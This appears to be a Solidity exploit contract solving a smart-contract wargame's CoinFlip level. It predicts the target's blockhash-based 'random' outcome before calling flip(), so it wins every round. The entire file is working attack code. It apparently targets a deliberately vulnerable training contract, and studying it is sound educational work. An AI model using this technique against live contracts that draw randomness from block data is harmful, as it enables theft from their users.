// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    address public contractAddress;
    uint256 public consecutiveWins = 0;
    uint256 private lastHash;
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    CoinFlip public coinFlipType;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
        coinFlipType = CoinFlip(_contractAddress);
    }

    function hackContract() external returns (uint256) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        
        if (lastHash == blockValue) {
          revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool isRight = coinFlipType.flip(side);

        if (isRight) {
            consecutiveWins++;
        } else {
            consecutiveWins = 0;
        }
        
        return consecutiveWins;
    }
}
